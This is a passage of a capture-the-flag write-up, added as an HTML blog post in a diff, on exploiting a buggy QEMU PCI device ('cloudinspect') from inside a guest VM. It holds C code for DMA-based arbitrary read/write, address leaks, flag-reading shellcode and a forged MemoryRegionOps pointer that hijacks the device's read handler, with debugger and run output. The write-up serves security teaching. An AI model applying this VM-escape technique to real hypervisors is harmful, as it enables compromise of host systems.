+uint64_t dmabuf_phys_addr;
+<span style="color:#8be9fd">int</span> fd;
+
+<span style="color:#ff79c6">#define PATH &#34;/sys/devices/pci0000:00/0000:00:02.0/resource0&#34;
+</span><span style="color:#ff79c6"></span>
+<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">iowrite</span>(uint64_t addr, uint64_t value)
+{
+		<span style="color:#ff79c6">*</span>((uint64_t<span style="color:#ff79c6">*</span>)(iomem <span style="color:#ff79c6">+</span> addr)) <span style="color:#ff79c6">=</span> value;
+}
+
+uint64_t <span style="color:#50fa7b">ioread</span>(uint64_t addr)
+{
+		<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">*</span>((uint64_t<span style="color:#ff79c6">*</span>)(iomem <span style="color:#ff79c6">+</span> addr));
+}
+
+uint64_t <span style="color:#50fa7b">write_dmabuf</span>(uint64_t offt, uint64_t value) {
+		<span style="color:#ff79c6">*</span>(uint64_t<span style="color:#ff79c6">*</span> )dmabuf <span style="color:#ff79c6">=</span> value;
+		iowrite(CLOUDINSPECT_MMIO_OFFSET_CMD, CLOUDINSPECT_DMA_PUT_VALUE);
+		iowrite(CLOUDINSPECT_MMIO_OFFSET_DST, offt);
+		iowrite(CLOUDINSPECT_MMIO_OFFSET_CNT, <span style="color:#bd93f9">8</span>);
+		iowrite(CLOUDINSPECT_MMIO_OFFSET_SRC, dmabuf_phys_addr);
+		iowrite(CLOUDINSPECT_MMIO_OFFSET_TRIGGER, <span style="color:#bd93f9">0x300</span>);
+		<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+}
+
+uint64_t <span style="color:#50fa7b">read_offt</span>(uint64_t offt) {
+		iowrite(CLOUDINSPECT_MMIO_OFFSET_CMD, CLOUDINSPECT_DMA_PUT_VALUE);
+		iowrite(CLOUDINSPECT_MMIO_OFFSET_SRC, offt);
+		iowrite(CLOUDINSPECT_MMIO_OFFSET_CNT, <span style="color:#bd93f9">8</span>);
+		iowrite(CLOUDINSPECT_MMIO_OFFSET_DST, dmabuf_phys_addr);
+		ioread(CLOUDINSPECT_MMIO_OFFSET_TRIGGER);
+		<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">*</span>(uint64_t<span style="color:#ff79c6">*</span> )dmabuf;
+}
+
+<span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
+		<span style="color:#8be9fd">int</span> fd1 <span style="color:#ff79c6">=</span> open(PATH, O_RDWR <span style="color:#ff79c6">|</span> O_SYNC);
+		<span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">==</span> fd1) {
+				fprintf(stderr, <span style="color:#f1fa8c">&#34;Cannot open %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, PATH);
+				<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;
+		} <span style="color:#6272a4">// open resource0 to interact with the device
+</span><span style="color:#6272a4"></span>		
+		iomem <span style="color:#ff79c6">=</span> mmap(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x1000</span>, PROT_READ <span style="color:#ff79c6">|</span> PROT_WRITE, MAP_SHARED, fd1, <span style="color:#bd93f9">0</span>); <span style="color:#6272a4">// map resource0
+</span><span style="color:#6272a4"></span>		printf(<span style="color:#f1fa8c">&#34;iomem @ %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, iomem);
+		
+		fd <span style="color:#ff79c6">=</span> open(<span style="color:#f1fa8c">&#34;/proc/self/pagemap&#34;</span>, O_RDONLY);
+		<span style="color:#ff79c6">if</span> (fd <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
+				perror(<span style="color:#f1fa8c">&#34;open&#34;</span>);
+				exit(<span style="color:#bd93f9">1</span>);
+		}
+
+		dmabuf <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x1000</span>);
+		memset(dmabuf, <span style="color:#f1fa8c">&#39;\x00&#39;</span>, <span style="color:#ff79c6">sizeof</span>(dmabuf));
+		<span style="color:#ff79c6">if</span> (MAP_FAILED <span style="color:#ff79c6">==</span> iomem) {
+				<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;
+		}
+
+		mlock(dmabuf, <span style="color:#bd93f9">0x1000</span>); <span style="color:#6272a4">// trigger PAGE_FAULT to acually map the page
+</span><span style="color:#6272a4"></span>		dmabuf_phys_addr <span style="color:#ff79c6">=</span> virt2phys(dmabuf); <span style="color:#6272a4">// grab physical address according to pagemap
+</span><span style="color:#6272a4"></span>		printf(<span style="color:#f1fa8c">&#34;DMA buffer (virt) @ %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, dmabuf);
+		printf(<span style="color:#f1fa8c">&#34;DMA buffer (phys) @ %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, (<span style="color:#8be9fd">void</span><span style="color:#ff79c6">*</span>)dmabuf_phys_addr);
+}
+</code></pre></div><p>Now we can interact with the device we got two primitive of arbitrary read / write. The <code>read_offt</code> and <code>write_dmabuf</code> functions permit us to read / write a 8 bytes to an arbitrary offset from the <code>dmabuf</code> object address.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>I did a lot of things which didn&rsquo;t worked, so let&rsquo;s summarize all my thoughts:</p>
+<ul>
+<li>If we leak the object&rsquo;s address, we can write at any location for which we know the base address, for example overwrite GOT pointers (but it will not succeed because of RELRO).</li>
+<li>If we take a look at all the memory areas mapped in the qemu process we can see very large memory area in rwx, which means if we can leak its address and if we can redirect RIP, we just have to write and jmp on a shellcode written in this area.</li>
+<li>To achieve the leaks, given that the CloudInspectState structure is allocated on the heap, and that we can read / write at an arbitrary offset from the object&rsquo;s address we can:
+<ul>
+<li>Scan heap memory for pointers to the qemu binary to leak the base address of the binary.</li>
+<li>Scan heap memory  for pointers to the heap itself (next, prev pointers for freed objects for example), and then compute the object&rsquo;s address.</li>
+<li>Scan heap memory to leak the rwx memory area</li>
+<li>Scan all the memory area we can read to find a leak of the rwx memory area.</li>
+</ul>
+</li>
+<li>To redirect RIP I thought to:
+<ul>
+<li>Overwrite the <code>destructor</code> function pointer in the <code>MemoryRegion</code> structure.</li>
+<li>Write in a writable area a fake <code>MemoryRegionOps</code> structure  for which a certain handler points to our shellcode and make <code>CloudInspectState.mmio.ops</code> point to it.</li>
+</ul>
+</li>
+</ul>
+<p>According to the environment, scan the heap memory is not reliable at all. I succeed to leak the rwx memory area, the binary base address, the heap base address from some contiguous objects in the heap. To redirect RIP, for some reason, the <code>destructor</code> is never called, so we have to craft a fake <code>MemoryRegionOps</code> structure. And that&rsquo;s how I read the flag on the disk. But the issue is that remotely, the offset between the heap base and the object is not the same, furthermore, the offset for the rwx memory leak is I guess different as well. So we have to find a different way to leak the object and the rwx memory area.</p>
+<h3 id="leak-some-memory-areas">Leak some memory areas</h3>
+<p>To see where we can find pointers to the rwx memory area, we can make use of the <code>search</code> command in <code>pwndbg</code>:</p>
+<pre><code>pwndbg&gt; vmmap                                                                                                                                                                              
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA                                                                                                                                            
+    0x559a884e1000     0x559a88791000 r--p   2b0000 0      /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
+    0x559a88791000     0x559a88c5d000 r-xp   4cc000 2b0000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
+    0x559a88c5d000     0x559a890ff000 r--p   4a2000 77c000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
+    0x559a89100000     0x559a89262000 r--p   162000 c1e000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
+    0x559a89262000     0x559a89353000 rw-p    f1000 d80000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
+    0x559a89353000     0x559a89377000 rw-p    24000 0      [anon_559a89353]                                                                                                                    
+    0x559a8a059000     0x559a8b0e7000 rw-p  108e000 0      [heap]                                                                                                                              
+    0x7fc5f4000000     0x7fc5f4a37000 rw-p   a37000 0      [anon_7fc5f4000]                                                                                                              
+    0x7fc5f4a37000     0x7fc5f8000000 ---p  35c9000 0      [anon_7fc5f4a37]                                                                                                                    
+    0x7fc5fbe00000     0x7fc603e00000 rw-p  8000000 0      [anon_7fc5fbe00]                                                                                                                    
+    0x7fc603e00000     0x7fc603e01000 ---p     1000 0      [anon_7fc603e00]                                                                                                                    
+    0x7fc604000000     0x7fc643fff000 rwxp 3ffff000 0      [anon_7fc604000]                                                                                                                  
+    [SKIP]
+pwndbg&gt; search -4 0x7fc60400 -w                                                                                                                                                                
+[anon_559a89353] 0x559a89359002 0x7fc60400                                                                                                                                                     
+[anon_559a89353] 0x559a8935904a 0x7fc60400                                                                                                                                                     
+[anon_559a89353] 0x559a89359052 0x1600007fc60400                                                                                                                                               
+[anon_559a89353] 0x559a8935905a 0x2d00007fc60400                                                                                                                                               
+[anon_559a89353] 0x559a89359062 0xffd300007fc60400                                                                                                                                             
+[anon_559a89353] 0x559a89359072 0x7fc60400                                                                                                                                                     
+[anon_559a89353] 0x559a89372b2a 0x10100007fc60400                                                                                                                                              
+[anon_559a89353] 0x559a89372bb2 0x100000007fc60400                                                                                                                                             
+[anon_559a89353] 0x559a89372bba 0xf00000007fc60400                                                                                                                                             
+[heap]          0x559a8a2dccf2 0x2d00007fc60400                                                                                                                                                
+[heap]          0x559a8a2dccfa 0x7fc60400                                                                                                                                                      
+[heap]          0x559a8a2dcd6a 0x7fc60400                                                                                                                                                      
+[heap]          0x559a8a2dcefa 0xffd300007fc60400                                                                                                                                              
+[heap]          0x559a8a2dcf18 0x7fc60400                                                                                                                                                      
+[SKIP]
+</code></pre><p>Given that we don&rsquo;t want to get the leak from heap because of the unreliability we can see that there are available leaks in a writable area of the binary in <code>anon_559a89353</code>, indeed the page address looks like a PIE based binary address or an heap address (but the address is not marked heap), and if we look more carefully, the page is contiguous to the last file mapped memory area. Now we can leak the rwx memory area, lets' find a way to leak object&rsquo;s address! I asked on the hack.lu discord a hint for this leak because didn&rsquo;t have any idea. And finally it&rsquo;s quite easy, we can just leak the <code>opaque</code> pointer in the <code>MemoryRegion</code> structure which points to the object&rsquo;s address.</p>
+<p>If I summarize we have:</p>
+<ul>
+<li>A reliable leak of:
+<ul>
+<li>the object&rsquo;s address with the <code>opaque</code> pointer</li>
+<li>the binary base address (from the heap)</li>
+<li>the rwx memory area (writable memory area that belongs to the binary).</li>
+</ul>
+</li>
+</ul>
+<p>Then we can write this code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6272a4">// offset I got in gdb locally
+</span><span style="color:#6272a4"></span>uint64_t base <span style="color:#ff79c6">=</span> read_offt(<span style="color:#bd93f9">0x10c0</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">3</span>) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0xdef90</span>; <span style="color:#6272a4">// heap leak
+</span><span style="color:#6272a4"></span>uint64_t bss <span style="color:#ff79c6">=</span> base <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xbc2000</span>; <span style="color:#6272a4">// points to the anonnymous memory area right after the binary
+</span><span style="color:#6272a4"></span>uint64_t heap_base <span style="color:#ff79c6">=</span> read_offt(<span style="color:#bd93f9">0x1000</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">3</span>) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0xf3bff0</span>; <span style="color:#6272a4">// useless
+</span><span style="color:#6272a4"></span>uint64_t ops_struct <span style="color:#ff79c6">=</span> read_offt(<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0xd0</span>); <span style="color:#6272a4">// That&#39;s &amp;ClouInspctState.mmio.ops
+</span><span style="color:#6272a4"></span>uint64_t addr_obj <span style="color:#ff79c6">=</span> read_offt(<span style="color:#ff79c6">-</span>(<span style="color:#bd93f9">0xd0</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">8</span>)) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">2568</span>; <span style="color:#6272a4">// CloudInspectState.mmio.opaque
+</span><span style="color:#6272a4"></span>uint64_t leak_rwx <span style="color:#ff79c6">=</span> read_offt((bss <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x6000</span>) <span style="color:#ff79c6">-</span> addr_obj) <span style="color:#ff79c6">&amp;</span> <span style="color:#ff79c6">~</span><span style="color:#bd93f9">0xffff</span>; <span style="color:#6272a4">// leak in the bss
+</span><span style="color:#6272a4"></span>
+printf(<span style="color:#f1fa8c">&#34;[*] ops_struct: %lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, ops_struct);
+printf(<span style="color:#f1fa8c">&#34;[*] Binary base address: %lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, base);
+printf(<span style="color:#f1fa8c">&#34;[*] Heap base address: %lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, heap_base);
+printf(<span style="color:#f1fa8c">&#34;[*] Leak rwx: %lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, leak_rwx);
+printf(<span style="color:#f1fa8c">&#34;[*] Addr obj: %lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, addr_obj);
+
+<span style="color:#6272a4">/*
+</span><span style="color:#6272a4">[*] ops_struct: 559a89173f20
+</span><span style="color:#6272a4">[*] Binary base address: 559a88791000
+</span><span style="color:#6272a4">[*] Heap base address: 559a8a0561d0
+</span><span style="color:#6272a4">[*] Leak rwx: 7fc604000000
+</span><span style="color:#6272a4">[*] Addr obj: 559a8af92f88
+</span><span style="color:#6272a4">*/</span>
+</code></pre></div><h3 id="write-the-shellcode">Write the shellcode</h3>
+<p>I choose to write a shellcode to read the flag at <code>leak_rwx + 0x5000</code>, a known location we can easily read and print from the program. The shellcode is very simple:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#50fa7b">mov</span> <span style="color:#8be9fd;font-style:italic">rax</span>, <span style="color:#bd93f9">2</span> <span style="color:#6272a4">; SYS_open</span>
+<span style="color:#50fa7b">push</span> <span style="color:#bd93f9">0x67616c66</span> <span style="color:#6272a4">; flag in little endian</span>
+<span style="color:#50fa7b">mov</span> <span style="color:#8be9fd;font-style:italic">rdi</span>, <span style="color:#8be9fd;font-style:italic">rsp</span> <span style="color:#6272a4">; pointer flag string</span>
+<span style="color:#50fa7b">mov</span> <span style="color:#8be9fd;font-style:italic">rsi</span>, <span style="color:#bd93f9">0</span> <span style="color:#6272a4">; O_READ</span>
+<span style="color:#50fa7b">mov</span> <span style="color:#8be9fd;font-style:italic">rdx</span>, <span style="color:#bd93f9">0x1fd</span> <span style="color:#6272a4">; mode ?</span>
+<span style="color:#50fa7b">syscall</span>
+<span style="color:#50fa7b">mov</span> <span style="color:#8be9fd;font-style:italic">rdi</span>, <span style="color:#8be9fd;font-style:italic">rax</span> <span style="color:#6272a4">; fd</span>
+<span style="color:#50fa7b">xor</span> <span style="color:#8be9fd;font-style:italic">rax</span>, <span style="color:#8be9fd;font-style:italic">rax</span> <span style="color:#6272a4">; SYS_read</span>
+<span style="color:#50fa7b">lea</span> <span style="color:#8be9fd;font-style:italic">rsi</span>, [<span style="color:#8be9fd;font-style:italic">rip</span>] <span style="color:#6272a4">; pointer to the rwx memory area (cause we&#39;re executing code within)</span>
+<span style="color:#50fa7b">and</span> <span style="color:#8be9fd;font-style:italic">rsi</span>, <span style="color:#bd93f9">0xffffffffff000000</span> <span style="color:#6272a4">; compute the base address</span>
+<span style="color:#50fa7b">add</span> <span style="color:#8be9fd;font-style:italic">rsi</span>, <span style="color:#bd93f9">0x5000</span> <span style="color:#6272a4">; add the right offset</span>
+<span style="color:#50fa7b">mov</span> <span style="color:#8be9fd;font-style:italic">rdx</span>, <span style="color:#bd93f9">0x30</span> <span style="color:#6272a4">; length of the flag to read</span>
+<span style="color:#50fa7b">syscall</span>
+<span style="color:#50fa7b">add</span> <span style="color:#8be9fd;font-style:italic">rsp</span>, <span style="color:#bd93f9">8</span><span style="color:#6272a4">; we pushed the flag str so we destroy it</span>
+<span style="color:#50fa7b">ret</span> <span style="color:#6272a4">; return to continue the execution</span>
+</code></pre></div><p>To write the shellcode at <code>leak_rwx + 0x1000</code>, we can directly trigger a large write primitive:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#define CODE &#34;\x48\xc7\xc0\x02\x00\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\xfd\x01\x00\x00\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x8d\x35\x00\x00\x00\x00\x48\x81\xe6\x00\x00\x00\xff\x48\x81\xc6\x00\x50\x00\x00\x48\xc7\xc2\x30\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\xc3&#34;
+</span><span style="color:#ff79c6"></span>
+memcpy(dmabuf, CODE, <span style="color:#bd93f9">130</span>);
+
+printf(<span style="color:#f1fa8c">&#34;[*] Writing the shellcode @ %lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, leak_rwx <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x1000</span>);
+iowrite(CLOUDINSPECT_MMIO_OFFSET_CMD, CLOUDINSPECT_DMA_PUT_VALUE);
+iowrite(CLOUDINSPECT_MMIO_OFFSET_DST, leak_rwx <span style="color:#ff79c6">-</span> addr_obj <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x1000</span>);
+iowrite(CLOUDINSPECT_MMIO_OFFSET_CNT, <span style="color:#bd93f9">130</span>);
+iowrite(CLOUDINSPECT_MMIO_OFFSET_SRC, dmabuf_phys_addr);
+iowrite(CLOUDINSPECT_MMIO_OFFSET_TRIGGER, <span style="color:#bd93f9">0x300</span>);
+<span style="color:#6272a4">/*
+</span><span style="color:#6272a4">[*] Writing the shellcode @ 7fc604001000
+</span><span style="color:#6272a4">*/</span>
+</code></pre></div><h3 id="craft-fake-memoryregionops-structure">Craft fake MemoryRegionOps structure</h3>
+<p>To cratf a fake <code>MemoryRegionOps</code>, I just read the original <code>MemoryRegionOps</code> structure, I edited the <code>read</code> handler, and I wrote it back, in a writable memory area, at <code>leak_rwx+0x2000</code>. Given that <code>sizeof(MemoryRegionOps)</code> is not superior to <code>DMA_SIZE</code>, I can read and write in one time. Then we got:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6272a4">// Craft fake MemoryRegionOps structure by reading the original one
+</span><span style="color:#6272a4"></span>
+<span style="color:#ff79c6">struct</span> MemoryRegionOps fake_ops <span style="color:#ff79c6">=</span> {<span style="color:#bd93f9">0</span>};
+printf(<span style="color:#f1fa8c">&#34;[*] reading struct mmio.MemoryRegionOps @ %lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, ops_struct);
+
+iowrite(CLOUDINSPECT_MMIO_OFFSET_CMD, CLOUDINSPECT_DMA_PUT_VALUE);
+iowrite(CLOUDINSPECT_MMIO_OFFSET_SRC, <span style="color:#ff79c6">-</span>(addr_obj <span style="color:#ff79c6">-</span> ops_struct));
+iowrite(CLOUDINSPECT_MMIO_OFFSET_CNT, <span style="color:#ff79c6">sizeof</span>(<span style="color:#ff79c6">struct</span> MemoryRegionOps));
+iowrite(CLOUDINSPECT_MMIO_OFFSET_DST, dmabuf_phys_addr);
+ioread(CLOUDINSPECT_MMIO_OFFSET_TRIGGER);
+
+<span style="color:#6272a4">// Write it in the fake struct
+</span><span style="color:#6272a4"></span>memcpy(<span style="color:#ff79c6">&amp;</span>fake_ops, dmabuf, <span style="color:#ff79c6">sizeof</span>(<span style="color:#ff79c6">struct</span> MemoryRegionOps));
+fake_ops.read <span style="color:#ff79c6">=</span> (leak_rwx <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x1000</span>); 
+<span style="color:#6272a4">// Edit the handler we want to hook to make it point to the shellcode at leak_rwx + 0x1000
+</span><span style="color:#6272a4"></span>
+printf(<span style="color:#f1fa8c">&#34;[*] fake_ops.read = %lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, leak_rwx <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x1000</span>);
+memcpy(dmabuf, <span style="color:#ff79c6">&amp;</span>fake_ops, <span style="color:#ff79c6">sizeof</span>(<span style="color:#ff79c6">struct</span> MemoryRegionOps));
+
+<span style="color:#6272a4">// patch it and write it @ leak_rwx + 0x2000
+</span><span style="color:#6272a4"></span>iowrite(CLOUDINSPECT_MMIO_OFFSET_CMD, CLOUDINSPECT_DMA_PUT_VALUE);
+iowrite(CLOUDINSPECT_MMIO_OFFSET_DST, leak_rwx <span style="color:#ff79c6">-</span> addr_obj <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x2000</span>);
+iowrite(CLOUDINSPECT_MMIO_OFFSET_CNT, <span style="color:#ff79c6">sizeof</span>(<span style="color:#ff79c6">struct</span> MemoryRegionOps));
+iowrite(CLOUDINSPECT_MMIO_OFFSET_SRC, dmabuf_phys_addr);
+iowrite(CLOUDINSPECT_MMIO_OFFSET_TRIGGER, <span style="color:#bd93f9">0x300</span>);
+</code></pre></div><h3 id="hook-mmioops--profit">Hook mmio.ops + PROFIT</h3>
+<p>We just have to replace the original <code>CoudInspect.mmio.ops</code> pointer to a pointer to the <code>fake_ops</code> structure.
+Then, next time we send a read request, the shellcode will be executed! And we will just need to retablish the original <code>CoudInspect.mmio.ops</code> pointer to read the flag at <code>leak_rwx+0x5000</code>! Which gives:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">write_dmabuf(<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0xd0</span>, leak_rwx<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x2000</span>);
+<span style="color:#6272a4">// Set the pointer to the MemoryRegionOps to the fake MemoryRegionOps	
+</span><span style="color:#6272a4"></span>
+ioread(<span style="color:#bd93f9">0x37</span>); <span style="color:#6272a4">// trigger the read handler we control, then the shellcode is 
+</span><span style="color:#6272a4">// executed and the flag is written @ leak_rwx + 0x5000[enter link description here](cloudinspect)
+</span><span style="color:#6272a4"></span>
+printf(<span style="color:#f1fa8c">&#34;[*] CloudInspectState.mmio.ops.read () =&gt; jmp @ %lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, leak_rwx <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x1000</span>);
+
+<span style="color:#8be9fd">char</span> flag[<span style="color:#bd93f9">0x30</span>] <span style="color:#ff79c6">=</span> {<span style="color:#bd93f9">0</span>};
+<span style="color:#6272a4">// So we just have to read the flag @ leak_rwx + 0x5000
+</span><span style="color:#6272a4"></span>
+write_dmabuf(<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0xd0</span>, ops_struct);
+printf(<span style="color:#f1fa8c">&#34;[*] CloudInspectState.mmio.ops = original ops</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+printf(<span style="color:#f1fa8c">&#34;[*] Reading the flag @ %lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, leak_rwx <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x5000</span>);
+iowrite(CLOUDINSPECT_MMIO_OFFSET_CMD, CLOUDINSPECT_DMA_PUT_VALUE);
+iowrite(CLOUDINSPECT_MMIO_OFFSET_SRC, leak_rwx <span style="color:#ff79c6">-</span> addr_obj <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x5000</span>);
+iowrite(CLOUDINSPECT_MMIO_OFFSET_CNT, <span style="color:#bd93f9">0x30</span>);
+iowrite(CLOUDINSPECT_MMIO_OFFSET_DST, dmabuf_phys_addr);
+<span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>ioread(CLOUDINSPECT_MMIO_OFFSET_TRIGGER)) {
+		perror(<span style="color:#f1fa8c">&#34;Failed to read the flag</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+		<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;
+}
+
+memcpy(flag, dmabuf, <span style="color:#bd93f9">0x30</span>);
+printf(<span style="color:#f1fa8c">&#34;flag: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, flag);
+
+
+<span style="color:#6272a4">// adresses are different because here is another execution on the remote challenge
+</span><span style="color:#6272a4"></span><span style="color:#6272a4">/*
+</span><span style="color:#6272a4">b&#39;[*] CloudInspectState.mmio.ops.read () =&gt; jmp @ 7fe3dc001000\r\r\n&#39;
+</span><span style="color:#6272a4">b&#39;[*] CloudInspectState.mmio.ops = original ops\r\r\n&#39;
+</span><span style="color:#6272a4">b&#39;[*] Reading the flag @ 7fe3dc005000\r\r\n&#39;
+</span><span style="color:#6272a4">b&#39;flag: flag{cloudinspect_inspects_your_cloud_0107}\r\r\n&#39;
+</span><span style="color:#6272a4">
+</span><span style="color:#6272a4">flag: flag{cloudinspect_inspects_your_cloud_0107}
+</span><span style="color:#6272a4">*/</span>
+</code></pre></div><p>Thanks for the organizers for this awesome event! The other pwn challenges look like very interesting as well!
+You can the final exploit <a href="https://github.com/ret2school/ctf/blob/master/2021/hack.lu/pwn/cloudinspect/remote.c">here</a>.</p>
+<h2 id="resources">Resources</h2>
+<ul>
+<li><a href="https://tldp.org/LDP/tlk/dd/pci.html">Interesting article about PCI devices</a></li>
+<li><a href="https://www.kernel.org/doc/Documentation/filesystems/sysfs-pci.txt">Linux kernel PCI documentation</a></li>
+<li><a href="https://www.kernel.org/doc/Documentation/vm/pagemap.txt">Linux kernel pagemap documentation</a></li>
+</ul>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
